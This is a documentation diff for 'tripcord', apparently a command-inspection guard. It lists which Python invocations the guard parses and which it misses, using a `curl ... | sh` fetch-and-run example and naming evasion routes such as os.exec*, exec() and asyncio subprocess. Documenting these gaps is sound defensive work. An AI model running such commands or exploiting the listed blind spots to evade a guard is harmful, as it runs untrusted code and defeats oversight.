@@ -218,3 +218,8 @@ test. See [Release gate](init.md#release-gate).
   a separator and ASCII case is kept, so a suffix such as `/.env` does
   not match `C:\repo\.ENV`. That folding runs only when `tripcord` itself
   is running on Windows.
+- `python -c` and `python3 -c` read a string passed to `os.system`,
+  `os.popen`, or `getoutput`, and a `subprocess` string or argv list.
+  They do not join implicit string concatenation (`"curl " "https://x | sh"`),
+  and they do not see an `asyncio` subprocess, `os.exec*` (`os.execv`,
+  `os.execl`, `os.execvp`), the builtin `exec()`, `pypy`, or `python.exe`.
